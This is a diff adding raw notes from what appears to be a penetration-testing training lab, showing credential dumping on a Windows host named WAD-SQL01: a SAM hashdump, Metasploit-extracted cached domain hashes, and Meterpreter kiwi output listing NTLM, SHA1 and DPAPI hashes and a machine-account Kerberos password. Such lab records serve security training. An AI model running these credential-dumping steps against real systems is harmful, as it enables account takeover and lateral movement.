@@ -251,4 +251,107 @@ training_cloud@wad-kali02:~$ /opt/john/run/john --format=krb5tgs --show hash
 [*] Scanned 4 of 4 hosts (100% complete)
 [*] Auxiliary module execution completed
 
+/hasdump sur .11 smblogin
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:2e71b731ab1d9633b426042fa274e4f3:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+/MS_cache sur .11
+[*] Executing module against WAD-SQL01
+[*] Cached Credentials Setting: 10 - (Max is 50 and 0 disables, and 10 is default)
+[*] Obtaining boot key...
+[*] Obtaining Lsa key...
+[*] Vista or above system
+[*] Obtaining NL$KM...
+[*] Dumping cached credentials...
+[*] Hash are in MSCACHE_VISTA format. (mscash2)
+[+] MSCACHE v2 saved in: /home/training_cloud/.msf4/loot/20200309151610_groupe_3_10.13.37.11_mscache2.creds_454632.txt
+[*] John the Ripper format:
+# mscash2
+student10:$DCC2$10240#student10#3abbf1b0d6ae57ae33b9bbcd8f517df0::
+student3:$DCC2$10240#student3#9a437f0ac6b1de0fe956881cba32e123::
+student2:$DCC2$10240#student2#7a4ec3f4d084e8f804a893b83a5a9b25::
+student13:$DCC2$10240#student13#384db696be6049448a175a1b0c0cee29::
+student5:$DCC2$10240#student5#e75bdc8be5cbc851d7cd99bf19965c46::
+student12:$DCC2$10240#student12#c7d00545101994c08be6b0fa8499b3b5::
+student14:$DCC2$10240#student14#3fcc52d350bc7a5f792f23a05d7dad0f::
+student1:$DCC2$10240#student1#b9943d011c6b74e84fe0efe6573dcfc4::
+student7:$DCC2$10240#student7#9d59e287ea7c935e5bac3030bdecb923::
+student6:$DCC2$10240#student6#df3e709321022d938a0fd26aebee5b71::
 
+[*] Post module execution completed
+
+/kiwi .11 
+meterpreter > creds_all                                                                               
+[+] Running as SYSTEM
+[*] Retrieving all credentials
+msv credentials
+===============
+
+Username    Domain  NTLM                              SHA1                                      DPAPI
+--------    ------  ----                              ----                                      -----
+WAD-SQL01$  WAD     3ee90156605fe3bd77a71a11bd926818  df6ecf5ae9b65d6ef772b4ef252fe52e9987e4d9  
+student1    WAD     e10ae333f1fecab8972c1a19bfe50313  6d90241dbaf04c034d30333c9f2afac54bb28055  5a74e49213ffc3a828bf2cd94936dd75
+student10   WAD     e10ae333f1fecab8972c1a19bfe50313  6d90241dbaf04c034d30333c9f2afac54bb28055  a352b13f878e30551ad5cc6672495713
+student11   WAD     e10ae333f1fecab8972c1a19bfe50313  6d90241dbaf04c034d30333c9f2afac54bb28055  6c9e5c959224fdd2c594d7573cc44abd
+student12   WAD     e10ae333f1fecab8972c1a19bfe50313  6d90241dbaf04c034d30333c9f2afac54bb28055  55f6ab1b6e6760d914917043559e2d8a
+student13   WAD     e10ae333f1fecab8972c1a19bfe50313  6d90241dbaf04c034d30333c9f2afac54bb28055  63740a7798ad266fc78448f99bebc2d3
+student14   WAD     e10ae333f1fecab8972c1a19bfe50313  6d90241dbaf04c034d30333c9f2afac54bb28055  b38bd3fa09a117d205e669d3030bf587
+student15   WAD     e10ae333f1fecab8972c1a19bfe50313  6d90241dbaf04c034d30333c9f2afac54bb28055  967596fb7bd594482ff142c7f7d5846a
+student16   WAD     e10ae333f1fecab8972c1a19bfe50313  6d90241dbaf04c034d30333c9f2afac54bb28055  840858e642642de24f23b0f73718f03f
+student2    WAD     e10ae333f1fecab8972c1a19bfe50313  6d90241dbaf04c034d30333c9f2afac54bb28055  d270401898ca6ee76a01edfcc464af9f
+student3    WAD     e10ae333f1fecab8972c1a19bfe50313  6d90241dbaf04c034d30333c9f2afac54bb28055  956a37fc5500644c785a71751b5e3837
+student4    WAD     e10ae333f1fecab8972c1a19bfe50313  6d90241dbaf04c034d30333c9f2afac54bb28055  b4802157babe7f664354818099267166
+student5    WAD     e10ae333f1fecab8972c1a19bfe50313  6d90241dbaf04c034d30333c9f2afac54bb28055  77eb4051c05bd400e18fb9d3f7518941
+student6    WAD     e10ae333f1fecab8972c1a19bfe50313  6d90241dbaf04c034d30333c9f2afac54bb28055  4db162e1a8971acdcda779ceb6871d02
+student7    WAD     e10ae333f1fecab8972c1a19bfe50313  6d90241dbaf04c034d30333c9f2afac54bb28055  a158df6855b9f2d25f84b1a0c551812c
+student8    WAD     e10ae333f1fecab8972c1a19bfe50313  6d90241dbaf04c034d30333c9f2afac54bb28055  6460368868d87421c11de111601c121f
+student9    WAD     e10ae333f1fecab8972c1a19bfe50313  6d90241dbaf04c034d30333c9f2afac54bb28055  e111e74f248ae2bb5c74c3f9f47af9d6
+
+wdigest credentials
+===================
+
+Username    Domain  Password
+--------    ------  --------
+(null)      (null)  (null)
+WAD-SQL01$  WAD     (null)
+student1    WAD     (null)
+student10   WAD     (null)
+student11   WAD     (null)
+student12   WAD     (null)
+student13   WAD     (null)
+student14   WAD     (null)
+student15   WAD     (null)
+student16   WAD     (null)
+student2    WAD     (null)
+student3    WAD     (null)
+student4    WAD     (null)
+student5    WAD     (null)
+student6    WAD     (null)
+student7    WAD     (null)
+student8    WAD     (null)
+student9    WAD     (null)
+
+kerberos credentials
+====================
+
+Username    Domain     Password
+--------    ------     --------
+(null)      (null)     (null)
+WAD-SQL01$  wad.local  M\s5\"'N(I4D]Y#mi5&A'?h>&<?DQ]r p'Z-?h"p/wFvet.5E53!cQ-K-z_CU1r_rCPCHy`r0+B!H^un?)te@@pd4JcpJ<>F) \gzvX"G#u=?qrqj5Hzh,m(
+student1    WAD.LOCAL  (null)
+student10   WAD.LOCAL  (null)
+student11   WAD.LOCAL  (null)
+student12   WAD.LOCAL  (null)
+student13   WAD.LOCAL  (null)
+student14   WAD.LOCAL  (null)
+student16   WAD.LOCAL  (null)
+student2    WAD.LOCAL  (null)
+student3    WAD.LOCAL  (null)
+student4    WAD.LOCAL  (null)
+student5    WAD.LOCAL  (null)
+student6    WAD.LOCAL  (null)
+student7    WAD.LOCAL  (null)
+student8    WAD.LOCAL  (null)
+student9    WAD.LOCAL  (null)
+toto13      wad.local  (null)
+wad-sql01$  WAD.LOCAL  (null)
